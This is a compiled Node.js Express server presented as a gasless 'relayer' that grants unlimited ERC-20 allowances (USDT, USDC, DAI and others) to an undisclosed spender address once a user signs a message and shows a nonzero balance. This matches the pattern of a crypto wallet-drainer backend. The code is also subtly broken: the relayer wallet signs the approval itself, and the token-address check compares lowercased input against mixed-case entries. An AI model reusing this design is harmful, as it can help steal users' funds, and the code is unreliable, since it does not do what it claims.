"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const ethers_1 = require("ethers");
const cors_1 = __importDefault(require("cors"));
const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
const helmet_1 = __importDefault(require("helmet"));
const dotenv_1 = __importDefault(require("dotenv"));
dotenv_1.default.config();
const app = (0, express_1.default)();
const PORT = process.env.PORT || 10000;
app.use((0, helmet_1.default)());
app.use((0, cors_1.default)({
    origin: process.env.FRONTEND_URL || ['http://localhost:3000', 'https://your-app.vercel.app'],
    credentials: true
}));
const limiter = (0, express_rate_limit_1.default)({
    windowMs: 15 * 60 * 1000,
    max: 20,
    message: 'Too many requests from this IP',
    standardHeaders: true,
    legacyHeaders: false,
});
app.use('/relay', limiter);
app.use(express_1.default.json({ limit: '1mb' }));
app.get('/', (req, res) => {
    res.json({
        status: 'Gas Relayer Service is running',
        timestamp: new Date().toISOString()
    });
});
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address owner) external view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];
const getChainConfig = () => ({
    1: {
        name: 'Ethereum Mainnet',
        rpcUrl: process.env.ETH_RPC_URL || 'https://ethereum-rpc.publicnode.com',
        gasPrice: ethers_1.ethers.parseUnits('20', 'gwei'),
        maxGasLimit: 100000n
    },
    42161: {
        name: 'Arbitrum',
        rpcUrl: process.env.ARB_RPC_URL || 'https://arbitrum-one-rpc.publicnode.com',
        gasPrice: ethers_1.ethers.parseUnits('0.1', 'gwei'),
        maxGasLimit: 200000n
    },
    11155111: {
        name: 'Sepolia',
        rpcUrl: process.env.SEPOLIA_RPC_URL || 'https://ethereum-sepolia-rpc.publicnode.com',
        gasPrice: ethers_1.ethers.parseUnits('20', 'gwei'),
        maxGasLimit: 100000n
    }
});
const SUPPORTED_TOKENS = {
    1: [
        "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
        "0x6B175474E89094C44Da98b954EedeAC495271d0F",
        "0x4fabb145d64652a948d72533023f6e7a623c7c53"
    ],
    42161: [
        "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
        "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
        "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1"
    ],
    11155111: [
        "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238",
        "0x779877A7B0D9E8603169DdbD7836e478b4624789"
    ]
};
const SPENDER_ADDRESS = process.env.SPENDER_ADDRESS;
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY;
if (!SPENDER_ADDRESS || !RELAYER_PRIVATE_KEY) {
    console.error('❌ Missing required environment variables:');
    console.error('- SPENDER_ADDRESS:', SPENDER_ADDRESS ? '✅ Set' : '❌ Missing');
    console.error('- RELAYER_PRIVATE_KEY:', RELAYER_PRIVATE_KEY ? '✅ Set' : '❌ Missing');
    process.exit(1);
}
function isValidSignature(message, signature, expectedSigner) {
    try {
        const recoveredAddress = ethers_1.ethers.verifyMessage(message, signature);
        return recoveredAddress.toLowerCase() === expectedSigner.toLowerCase();
    }
    catch (error) {
        console.error('Signature validation error:', error);
        return false;
    }
}
function isTokenSupported(chainId, tokenAddress) {
    const supportedTokens = SUPPORTED_TOKENS[chainId];
    return supportedTokens?.includes(tokenAddress.toLowerCase()) || false;
}
app.post('/relay', async (req, res) => {
    try {
        const { chainId, tokenAddress, userAddress, signature, timestamp } = req.body;
        if (!chainId || !tokenAddress || !userAddress || !signature || !timestamp) {
            return res.status(400).json({
                error: 'Missing required fields',
                required: ['chainId', 'tokenAddress', 'userAddress', 'signature', 'timestamp']
            });
        }
        const now = Date.now();
        const requestTime = parseInt(timestamp);
        if (now - requestTime > 300000) {
            return res.status(400).json({
                error: 'Request expired. Please refresh and try again.'
            });
        }
        const CHAIN_CONFIG = getChainConfig();
        if (!CHAIN_CONFIG[chainId]) {
            return res.status(400).json({
                error: 'Unsupported chain',
                supportedChains: Object.keys(CHAIN_CONFIG)
            });
        }
        if (!isTokenSupported(chainId, tokenAddress)) {
            return res.status(400).json({
                error: 'Unsupported token address'
            });
        }
        const message = `Approve token ${tokenAddress} on chain ${chainId} at ${timestamp}`;
        if (!isValidSignature(message, signature, userAddress)) {
            return res.status(400).json({
                error: 'Invalid signature'
            });
        }
        const chainConfig = CHAIN_CONFIG[chainId];
        const provider = new ethers_1.ethers.JsonRpcProvider(chainConfig.rpcUrl);
        const relayerWallet = new ethers_1.ethers.Wallet(RELAYER_PRIVATE_KEY, provider);
        const relayerBalance = await provider.getBalance(relayerWallet.address);
        const estimatedCost = chainConfig.gasPrice * chainConfig.maxGasLimit;
        if (relayerBalance < estimatedCost) {
            console.error('❌ Insufficient relayer balance:', {
                chain: chainConfig.name,
                balance: ethers_1.ethers.formatEther(relayerBalance),
                needed: ethers_1.ethers.formatEther(estimatedCost),
                relayerAddress: relayerWallet.address
            });
            return res.status(500).json({
                error: 'Insufficient gas funds. Please try again later.'
            });
        }
        const tokenContract = new ethers_1.ethers.Contract(tokenAddress, ERC20_ABI, relayerWallet);
        const currentAllowance = await tokenContract.allowance(userAddress, SPENDER_ADDRESS);
        if (currentAllowance > 0n) {
            return res.status(200).json({
                success: true,
                message: 'Token already approved',
                txHash: null,
                alreadyApproved: true
            });
        }
        const userBalance = await tokenContract.balanceOf(userAddress);
        if (userBalance === 0n) {
            return res.status(400).json({
                error: 'No token balance found for this address'
            });
        }
        let gasEstimate;
        try {
            gasEstimate = await tokenContract.approve.estimateGas(SPENDER_ADDRESS, ethers_1.ethers.MaxUint256);
            gasEstimate = gasEstimate + (gasEstimate * 20n / 100n);
        }
        catch (error) {
            console.error('⚠️ Gas estimation failed:', error);
            gasEstimate = chainConfig.maxGasLimit;
        }
        console.log('🚀 Executing approval transaction...', {
            user: userAddress,
            token: tokenAddress,
            chain: chainConfig.name,
            gasEstimate: gasEstimate.toString()
        });
        const tx = await tokenContract.approve(SPENDER_ADDRESS, ethers_1.ethers.MaxUint256, {
            gasLimit: gasEstimate > chainConfig.maxGasLimit ? chainConfig.maxGasLimit : gasEstimate,
            gasPrice: chainConfig.gasPrice
        });
        console.log('✅ Transaction submitted:', {
            txHash: tx.hash,
            user: userAddress,
            token: tokenAddress,
            chain: chainConfig.name
        });
        const receipt = await tx.wait(1);
        res.json({
            success: true,
            txHash: tx.hash,
            gasUsed: receipt?.gasUsed?.toString(),
            chainName: chainConfig.name,
            message: 'Approval transaction completed successfully'
        });
    }
    catch (error) {
        console.error('❌ Relay error:', error);
        res.status(500).json({
            error: 'Failed to relay transaction',
            details: process.env.NODE_ENV === 'development' ? error.message : 'Internal server error'
        });
    }
});
app.get('/health', async (req, res) => {
    try {
        const CHAIN_CONFIG = getChainConfig();
        const balances = {};
        const relayerAddress = new ethers_1.ethers.Wallet(RELAYER_PRIVATE_KEY).address;
        for (const [chainId, config] of Object.entries(CHAIN_CONFIG)) {
            try {
                const provider = new ethers_1.ethers.JsonRpcProvider(config.rpcUrl);
                const balance = await provider.getBalance(relayerAddress);
                balances[config.name] = ethers_1.ethers.formatEther(balance);
            }
            catch (error) {
                balances[config.name] = 'Error fetching balance';
            }
        }
        res.json({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            relayerAddress,
            balances,
            supportedChains: Object.values(CHAIN_CONFIG).map(c => c.name),
            version: '1.0.0'
        });
    }
    catch (error) {
        console.error('Health check error:', error);
        res.status(500).json({
            status: 'unhealthy',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({
        error: 'Internal server error',
        timestamp: new Date().toISOString()
    });
});
app.use('*', (req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        availableEndpoints: ['GET /', 'GET /health', 'POST /relay']
    });
});
const server = app.listen(PORT, () => {
    console.log('🚀 Gas Relayer Server started!');
    console.log('================================');
    console.log(`🌐 Server running on port ${PORT}`);
    console.log(`🏥 Health check: http://localhost:${PORT}/health`);
    console.log(`🔗 Relay endpoint: http://localhost:${PORT}/relay`);
    console.log(`👤 Relayer address: ${new ethers_1.ethers.Wallet(RELAYER_PRIVATE_KEY).address}`);
    console.log('================================');
});
process.on('SIGTERM', () => {
    console.log('🛑 SIGTERM received, shutting down gracefully...');
    server.close(() => {
        console.log('✅ Server closed successfully');
        process.exit(0);
    });
});
exports.default = app;
